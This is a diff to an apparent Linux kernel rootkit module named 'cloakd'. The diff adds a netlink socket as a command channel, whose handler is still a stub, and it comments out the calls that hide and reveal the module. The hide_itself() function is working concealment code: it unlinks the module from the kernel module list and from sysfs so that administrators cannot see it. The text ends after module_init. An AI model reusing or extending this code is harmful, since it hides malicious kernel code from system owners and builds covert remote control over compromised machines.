@@ -1,54 +1,82 @@
 #include <linux/init.h>
 #include <linux/module.h>
+#include <linux/skbuff.h>
+#include <linux/netlink.h>
+#include <net/sock.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("unixbeard");
 
+
 struct cloakd_params 
 {
-	bool hidden;
-	struct list_head *mod_before_me;
-	struct list_head *mod_kobj_before_me;
+    bool hidden;
+    struct list_head *mod_before_me;
+    struct list_head *mod_kobj_before_me;
+    struct sock *nl_sock;
 };
 
 static struct cloakd_params params = { 
-	.hidden = false,
+    .hidden = false,
+    .nl_sock = NULL,
 };
  
+static void nl_recv_cmd(struct sk_buff*);
+
+struct netlink_kernel_cfg nl_kern_cfg = {
+    .groups = 1,
+    .input = nl_recv_cmd,
+};
+
 static void hide_itself(void)
 {
-	if (params.hidden)
-		return;
+    if (params.hidden)
+        return;
 
-	params.mod_before_me = THIS_MODULE->list.prev;
-	params.mod_kobj_before_me = THIS_MODULE->mkobj.kobj.entry.prev;
+    params.mod_before_me = THIS_MODULE->list.prev;
+    params.mod_kobj_before_me = THIS_MODULE->mkobj.kobj.entry.prev;
 
-	list_del(&THIS_MODULE->list);
-	kobject_del(&THIS_MODULE->mkobj.kobj);
-	list_del(&THIS_MODULE->mkobj.kobj.entry);
+    list_del(&THIS_MODULE->list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    list_del(&THIS_MODULE->mkobj.kobj.entry);
 
-	params.hidden = true;
-	printk(KERN_DEBUG "cloakd is hidden");
+    params.hidden = true;
+    printk(KERN_INFO "cloakd is hidden\n");
 }
-
+/*
 static void reveal_itself(void)
 {
-	if (!params.hidden)
-		return;
+    if (!params.hidden)
+        return;
 
-	list_add(&THIS_MODULE->list, params.mod_before_me);
-	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "cloakd");
-	params.hidden = false;
+    list_add(&THIS_MODULE->list, params.mod_before_me);
+    kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "cloakd");
+    params.hidden = false;
+}
+*/
+static void nl_recv_cmd(struct sk_buff *sk_buf)
+{
+    printk(KERN_INFO "cloakd: netlink command\n");
+}
+
+static void netlink_init(void)
+{
+    params.nl_sock = netlink_kernel_create(&init_net, 31 /*NETLINK_GENERIC*/, &nl_kern_cfg);	
+    if (!params.nl_sock)
+        printk(KERN_ERR "Can't create netlink socket\n");
 }
 
 static int __init cloakd_init(void)
 {
-	hide_itself();	
-	return 0;
+//    hide_itself();
+    netlink_init();
+    return 0;
 }
 
 static void __exit cloakd_exit(void)
-{}
+{
+    netlink_kernel_release(params.nl_sock);
+}
 
 
 module_init(cloakd_init);
